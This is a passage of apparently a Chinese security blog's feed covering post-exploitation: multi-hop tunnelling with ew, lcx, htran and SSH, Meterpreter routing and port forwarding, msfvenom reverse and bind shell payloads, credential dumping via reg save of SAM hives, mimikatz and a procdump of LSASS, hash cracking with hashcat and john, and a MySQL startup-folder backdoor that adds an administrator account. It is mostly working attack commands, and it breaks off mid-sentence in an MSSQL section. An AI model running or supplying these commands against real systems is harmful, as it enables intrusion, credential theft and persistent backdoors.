rssocks -d 3.3.3.3 -e 55544#2.2.2.2，3.3.3.3</span><br></pre></td></tr></table></figure><p>数据流向: SOCKS v5 -&gt; 0.0.0.0:1080 -&gt; 1.1.1.1:55545 -&gt; 2222:55544 -&gt; rssocks</p><p><strong>多级级联</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#四级级联</span><br><span class="line">./ew -s rcsocks -l 1080 -e 55545#0.0.0.0</span><br><span class="line">./ew -s lcx_slave -d 0.0.0.0 -e 55545 -f 1.1.1.1 -g 55545#0.0.0.0，1.1.1.1</span><br><span class="line">./ew -s lcx_listen -l 55545 -e 55544#1.1.1.1，2.2.2.2</span><br><span class="line">./ew -s lcx_slave -d 2.2.2.2 -e 55544 -f 3.3.3.3 -g 55545   #2.2.2.2，3.3.3.3</span><br><span class="line">./ew -s ssocksd -l 55545#3.3.3.3，4.4.4.4</span><br><span class="line"></span><br><span class="line">#五级级联</span><br><span class="line">./ew -s rcsocks -l 1080 -e 55545#0.0.0.0</span><br><span class="line">./ew -s lcx_slave -d 0.0.0.0 -e 55545 -f 1.1.1.1 -g 55545#0.0.0.0，1.1.1.1</span><br><span class="line">./ew -s lcx_listen -l 55545 -e 55544#1.1.1.1，2.2.2.2</span><br><span class="line">./ew -s lcx_slave -d 2.2.2.2 -e 55544 -f 3.3.3.3 -g 55544   #2.2.2.2，3.3.3.3</span><br><span class="line">./ew -s lcx_listen -l 55544 -e 55545#3.3.3.3，4.4.4.4</span><br><span class="line">./ew -s rssocks -d 3.3.3.3 -e 55545#4.4.4.4，5.5.5.5</span><br></pre></td></tr></table></figure><blockquote><p>多级级联的三种状态可以转发任意以TCP为基础的通讯服务，包括远程桌面／web服务 等。</p></blockquote><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>autoroute</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">meterpreter &gt; run get_local_subnets #查看目标主机路由信息</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.6.0/24#添加路由</span><br><span class="line">meterpreter &gt; run autoroute -d -s 192.168.6.0/24#删除路由</span><br><span class="line">meterpreter &gt; run autoroute -p#查看路由</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.6.0        255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">background</span><br><span class="line">use post/windows/gather/arp_scanner#可以先通过arp扫描粗略的扫一眼目标内网的机器大概有多少</span><br><span class="line">use auxiliary/scanner/portscan/#端口扫描</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p>socks代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">route add 1.1.1.1 255.255.255.255 1#除了上面的自动，也可以手动加</span><br><span class="line">use auxiliary/server/socks4a </span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">vi /etc/proxychains.conf</span><br><span class="line">socks4127.0.0.1 1080</span><br><span class="line">proxychains nmap -sT -Pn 192.168.6.0/24</span><br><span class="line">proxychains hydra -l root -P pass.txt -f -t 20 ssh://192.168.244.132</span><br></pre></td></tr></table></figure><p>msf添加的路由全为正向连接，所以不能reverse_tcp，而需要bind_tcp正向连接，bind_tcp只需要开启一个端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=8888 -f exe &gt; shell.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.6.5    #靶机ip</span><br><span class="line">set LPORT 8888    #靶机绑定的端口</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>内网穿透（多级代理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 root@1.1.1.1#0.0.0.0</span><br><span class="line">Add socks4 127.0.0.1:1080 in /etc/proxychains.conf</span><br><span class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 root@2.2.2.2#0.0.0.0</span><br><span class="line">Add socks4 127.0.0.1:1081 in /etc/proxychains.conf</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h3 id="lcx-exe"><a href="#lcx-exe" class="headerlink" title="lcx.exe"></a>lcx.exe</h3><p>有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap。</p><p>lcx有两大功能：</p><ol><li><p>端口转发(listen和slave成对使用)</p></li><li><p>端口映射(tran)</p></li></ol><p>端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\lcx.exe -listen 51 3388</span><br><span class="line">portmap -m 2 -p1 51 -p2 3388</span><br></pre></td></tr></table></figure><p>51为转发传输端口，3388为本机任意未被占用的端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\lcx.exe -slave 0.0.0.0 51 1.1.1.1 3389</span><br><span class="line">portmap -m 3 -h1 0.0.0.0 -p1 51 -h2 1.1.1.1 -p2 3389</span><br></pre></td></tr></table></figure><p>0.0.0.0为VPS，51为转发端口，1.1.1.1为肉鸡内网IP，3389为远程终端端口</p><p>3389连接时格式：127.0.0.1:3388</p><p>本地端口转发</p><p>由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口，目标主机上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\lcx.exe -tran 53 1.1.1.1 3389</span><br><span class="line">portmap -m 1 -p1 53 -h2 1.1.1.1 -p2 3389</span><br></pre></td></tr></table></figure><p>二层内网（一级代理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\lcx.exe -listen 51 3388#VPS监听</span><br><span class="line">.\lcx.exe -slave 0.0.0.0 51 1.1.1.1 51#内网1</span><br><span class="line">.\lcx.exe -tran 51 2.2.2.2 3389#内网2</span><br></pre></td></tr></table></figure><p>数据流向：127.0.0.1:3388 -&gt; 51 -&gt; 1.1.1.1:51 -&gt; 2.2.2.2:3389</p><p>三层内网（二级代理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\lcx.exe -listen 51 3388#VPS监听</span><br><span class="line">.\lcx.exe -slave 0.0.0.0 51 1.1.1.1 51#内网1</span><br><span class="line">.\lcx.exe -listen 50 51#内网2</span><br><span class="line">.\lcx.exe -slave 2.2.2.2 50 3.3.3.3 3389#内网3</span><br></pre></td></tr></table></figure><p>数据流向：127.0.0.1:3388 -&gt; 51 -&gt; 1.1.1.1:51 -&gt; 2.2.2.2:51  -&gt; 50 -&gt; 3.3.3.3:3389</p><p>N层内网</p><p>listen和slave成对使用，可衍生至N级代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.\lcx.exe -listen 51 3388#VPS监听</span><br><span class="line">.\lcx.exe -slave 0.0.0.0 51 1.1.1.1 51#内网1</span><br><span class="line">.\lcx.exe -listen 50 51#内网2</span><br><span class="line">...</span><br><span class="line">.\lcx.exe -slave 2.2.2.2 50 3.3.3.3 50#内网3</span><br><span class="line">.\lcx.exe -listen 51 50#内网4</span><br><span class="line">...</span><br><span class="line">.\lcx.exe -slave 2.2.2.2 50 3.3.3.3 50#内网5</span><br><span class="line">.\lcx.exe -tran 50 2.2.2.2 3389#内网6</span><br></pre></td></tr></table></figure><h3 id="htran-exe"><a href="#htran-exe" class="headerlink" title="htran.exe"></a>htran.exe</h3><p><strong>正向代理</strong></p><p>服务端 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htran.exe -s -bind 8888</span><br></pre></td></tr></table></figure><p>客户端 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SocksCap:SOCKS Version 5 服务端IP:8888</span><br></pre></td></tr></table></figure><p><strong>反向代理</strong></p><p>客户端 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htran.exe -s -listen 1234 8888</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htran.exe -s -connect 客户端IP 1234</span><br></pre></td></tr></table></figure><p>客户端 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SocksCap:SOCKS Version 5 127.0.0.1:8888</span><br></pre></td></tr></table></figure><p><strong>正向端口转发</strong></p><p>VPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htran.exe -p -tran 8888 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDP 服务端IP:8888</span><br></pre></td></tr></table></figure><p><strong>反向端口转发</strong></p><p>VPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htran.exe -p -listen 7777 8888</span><br></pre></td></tr></table></figure><p>服务端 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htran.exe -p -slave 客户端IP 7777 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDP 127.0.0.1:8888</span><br></pre></td></tr></table></figure><h3 id="Fpipe"><a href="#Fpipe" class="headerlink" title="Fpipe"></a>Fpipe</h3><p>端口重定向,多端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l 在本地监听的端口</span><br><span class="line">-s 从哪个端口发送出重定向的信息</span><br><span class="line">-r 要定向到IP主机的端口号</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细地显示过程</span><br></pre></td></tr></table></figure><p>来自80端口的信息，通过90端口，重定向到C主机的3389端口上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fpipe.exe -l 80 -s 90 -r 3389 1.1.1.1</span><br></pre></td></tr></table></figure><h3 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a>Tunna</h3><p>服务端</p><p>上传脚本</p><p>客户端</p><p>运行proxy.py 并指定端口 python proxy.py -u <a href="http://219.x.x.x/conn.jsp" target="_blank" rel="noopener">http://219.x.x.x/conn.jsp</a> -l 1234 -r 3389 -v</p><p>本地执行 rdesktop 127.0.0.1:1234</p><p>bug : 在过程中，出现远程桌面的黄框后程序断掉，不要关闭这个提示，再运行一次即可。</p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</span><br><span class="line">ssh -L 8080:127.0.0.1:80 root@1.1.1.1# Local Port</span><br><span class="line">ssh -R 8080:127.0.0.1:80 root@0.0.0.0# Remote Port</span><br></pre></td></tr></table></figure><p>远程端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 9527:2.2.2.2:3389 -fN 0.0.0.0#1.1.1.1</span><br><span class="line">rdesktop 127.0.0.1 9527#0.0.0.0</span><br></pre></td></tr></table></figure><p>本地端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 9527:2.2.2.2:3389 -fN 1.1.1.1#0.0.0.0</span><br><span class="line">rdesktop 127.0.0.1 9527#0.0.0.0</span><br></pre></td></tr></table></figure><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>要获取meterpreter会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe &gt; ~/Desktop/shell.exe</span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.43.100</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>portfwd 使用meterpreter的一个用于端口转发的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -r 2.2.2.2 -p 3389#1.1.1.1</span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line">   Index  Local         Remote            Direction</span><br><span class="line">   -----  -----         ------            ---------</span><br><span class="line">   1      0.0.0.0:3389  192.168.5.5:3389  Forward</span><br><span class="line"></span><br><span class="line">rdesktop 127.0.0.1:3389#0.0.0.0</span><br></pre></td></tr></table></figure><p>转发管理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portfwd list#列出端口转发条目</span><br><span class="line">portfwd delete -i 1#删除id为1的端口转发</span><br><span class="line">portfwd flush#清空所有转发</span><br></pre></td></tr></table></figure><blockquote><p>实际使用Portfwd效果可能会差，因为当数据流过大时候会将Meterpreter直接搞掉，推荐用socks代理转发。</p></blockquote><h3 id="ptunel"><a href="#ptunel" class="headerlink" title="ptunel"></a>ptunel</h3><p>需要肉鸡安装服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptunel -x 1234</span><br><span class="line">sudo ptunel -p 1.1.1.1 -lp 2222 -da 2.2.2.2 -dp 3389 -x 1234</span><br></pre></td></tr></table></figure><h3 id="mknod"><a href="#mknod" class="headerlink" title="mknod"></a>mknod</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe</span><br><span class="line">mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe    </span><br><span class="line">mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080)</span><br><span class="line">mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080)</span><br></pre></td></tr></table></figure><p>参考链接：</p><p>代理转发工具汇总分析<a href="http://liehu.tass.com.cn/archives/370" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/370</a></p><p><a href="https://hatboy.github.io/2018/08/28/内网端口转发及穿透" target="_blank" rel="noopener">https://hatboy.github.io/2018/08/28/内网端口转发及穿透</a></p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升(Hash破解)</title>
      <link href="/2019/07/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(Hash%E7%A0%B4%E8%A7%A3)/"/>
      <url>/2019/07/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(Hash%E7%A0%B4%E8%A7%A3)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h1><p>先获取密文数据</p><p>SHA1：40位十六进制 = 160二进制</p><p>使用工具破解</p><p>线上：cmd5、pmd5、somd5、chamd5</p><p>线下：cain/join/hashcat/Saminside/彩虹表破解（rainbow tables）</p><h1 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h1><h2 id="获取SAM文件"><a href="#获取SAM文件" class="headerlink" title="获取SAM文件"></a>获取SAM文件</h2><p>LM、NT密码</p><p>获取LM、NT密文</p><p><strong>Pwdump7.exe</strong></p><p><strong>QuarksPwDump.exe</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -dhl</span><br></pre></td></tr></table></figure><p><strong>wce.exe</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -l#登陆过的</span><br></pre></td></tr></table></figure><p><strong>cain</strong></p><ol><li><p>先从注册表中，手工获取hash</p><p>sam（HKLM\SAM：用户信息、权限、密码）</p><p>system（HKLM\SYSTEM：系统服务配置信息）</p><p>security（HKLM\SECURITY：策略、配置单元）</p><p>bat脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg save HKEY_LOCAL_MACHINE\sam C:\sam.hive</span><br><span class="line">reg save HKEY_LOCAL_MACHINE\system C:\system.hive</span><br><span class="line">reg save HKEY_LOCAL_MACHINE\security C:\security.hive</span><br></pre></td></tr></table></figure></li><li><p>下载上面三个文件到本地</p></li><li><p>先用LSA Secrets导入到cain</p></li><li><p>解密SAM文件</p></li></ol><h2 id="SAM文件破解"><a href="#SAM文件破解" class="headerlink" title="SAM文件破解"></a>SAM文件破解</h2><ul><li>在线破解</li><li>本地破解</li></ul><p><strong>SAMInside.exe</strong></p><p>导入pwdump的pass文件，可字典文件攻击、暴力破解攻击、彩虹表碰撞攻击。</p><p><strong>hashcat</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt --force</span><br></pre></td></tr></table></figure><h2 id="基于读取内存信息的破解"><a href="#基于读取内存信息的破解" class="headerlink" title="基于读取内存信息的破解"></a>基于读取内存信息的破解</h2><p><strong>GetPass.exe</strong></p><p><img src="/2019/07/10/权限提升(Hash破解)/Hash算法.assets/1562923395850.png" alt="1562923395850"></p><p><strong>wce.exe</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -w</span><br></pre></td></tr></table></figure><p><strong>mimikatz.exe</strong></p><p>获取账号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><strong>procdump</strong></p><p> procdump 下载 LSASS 进程的内存，因为 procdump 是 Microsoft Sysinternals tools 中的工具，所以 AV 是不会查杀它的（记住用管理员运行 cmd ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe C:\Users\times0ng\Desktop\lsass.dmp</span><br></pre></td></tr></table></figure><p>接着用 mimikatz 打开 dmp 文件，获取内存中的内容 // （ lsass.dmp 可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</span><br><span class="line">sekurlsa::tspkg</span><br></pre></td></tr></table></figure><h2 id="利用虚拟机文件获取密码"><a href="#利用虚拟机文件获取密码" class="headerlink" title="利用虚拟机文件获取密码"></a>利用虚拟机文件获取密码</h2><p>参考链接：<a href="https://cloud.tencent.com/developer/article/1180600" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1180600</a></p><p>PowerMemory<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="noopener">https://github.com/giMini/PowerMemory</a></p><p>quarks pwdump<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a></p><p>Memoryze<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="noopener">https://www.fireeye.com/services/freeware/memoryze.html</a></p><p>DumpIt<a href="http://qpdownload.com/dumpit/" target="_blank" rel="noopener">http://qpdownload.com/dumpit/</a></p><p>Volatility<a href="http://www.volatilityfoundation.org/26" target="_blank" rel="noopener">http://www.volatilityfoundation.org/26</a></p><h2 id="利用-kali-ISO-获取密码"><a href="#利用-kali-ISO-获取密码" class="headerlink" title="利用 kali ISO 获取密码"></a>利用 kali ISO 获取密码</h2><p>利用kali live挂载物理机磁盘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/</span><br></pre></td></tr></table></figure><p>查看SAM文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM</span><br><span class="line">hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt --force</span><br></pre></td></tr></table></figure><p>还可以放shift等各种后门</p><h1 id="Linux破解"><a href="#Linux破解" class="headerlink" title="Linux破解"></a>Linux破解</h1><p>取决于字典</p><h2 id="远程暴力破解"><a href="#远程暴力破解" class="headerlink" title="远程暴力破解"></a>远程暴力破解</h2><p>通过ssh连接方式</p><p><strong>brutesh</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brutesh.exe -h 192.168.1.1 -u root -d wordlist.txt</span><br></pre></td></tr></table></figure><p><strong>hydra(MSF)</strong></p><h2 id="本地暴力破解"><a href="#本地暴力破解" class="headerlink" title="本地暴力破解"></a>本地暴力破解</h2><p>获取到目标机器的shadow文件</p><p><strong>John</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=./pass.txt /etc/shadow</span><br><span class="line">john --show shadow</span><br></pre></td></tr></table></figure><p><strong>Johnny</strong></p><p>图形化界面版的</p><p><strong>unshadow</strong></p><p>将shadow和password合成一个文件再导入Johnny</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/password /etc/shadow &gt; /tmp/pass.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升(第三方提权)</title>
      <link href="/2019/07/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%90%E6%9D%83)/"/>
      <url>/2019/07/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%90%E6%9D%83)/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="DLL提权"><a href="#DLL提权" class="headerlink" title="DLL提权"></a>DLL提权</h2><p>lpk.dll劫持添加shirft后门</p><h2 id="开机启动项提权"><a href="#开机启动项提权" class="headerlink" title="开机启动项提权"></a>开机启动项提权</h2><p>开机启动项提权思路：</p><p>原理：利用mysql，将后门写入开机自启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器。</p><blockquote><p>这个要求mysql的权限很高，至少是管理员权限甚至是system</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">show databases ;</span><br><span class="line">use test;</span><br><span class="line">show tables;</span><br><span class="line">create table b (cmd text); </span><br><span class="line">insert into b values (&quot;net user Aspnet123545345! /add&quot;);</span><br><span class="line">insert into b values (&quot;net localgroup administrators Aspnet /add&quot;);</span><br><span class="line">insert into b values (&quot;del b.bat&quot;);</span><br><span class="line">select  from b into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\b.bat&quot;;</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\#windows2003及xp的路径</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h2><p><strong>提权思路：</strong></p><ol><li><p>MSSQL在Windows server类的操作系统上，默认具有system权限。</p></li><li><p>获取webshell之后可尝试在服务器各个站点的目录寻找sa的密码（某些站点直接在web应用程序中使用sa连接数据库），一般情况下，.net的站点数据库连接字符串在web.config或者和global.aspx也有可能是编译在DLL文件当中。</p></li><li><p>通过端口扫描查看1433（mssql默认端口）是否对外开放。如果对外开放则使用sql连接器进行提权，如果没有对外开放，则使用webshell自带的mssql数据库连接功能连接至mssql数据库。</p></li><li><p>Sa作为mssql的默认最高权限的账户，在正常情况下，可以通过xp_cmdshell等方式执行系统命令。</p></li></ol><p><strong>提权前提：</strong></p><p>所谓利用数据库进行提权，利用的其实是数据库的运行权限，所以只要我们满足以下条件即可进行提权：</p><ul><li><p>必须获得sa的账号密码或者与sa相同权限的账号密码，且mssql没有被降权。</p></li><li><p>必须可以以某种方式执行sql语句，例如：webshell或者是1433端口的连接。</p><blockquote><p>连接工具：Navicat Premium 12、SQL TOOLS 2.0功能增强版、开源连接工具</p></blockquote></li></ul><ol><li><p>连接数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases#查看所有数据库名</span><br></pre></td></tr></table></figure></li><li><p>查看版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 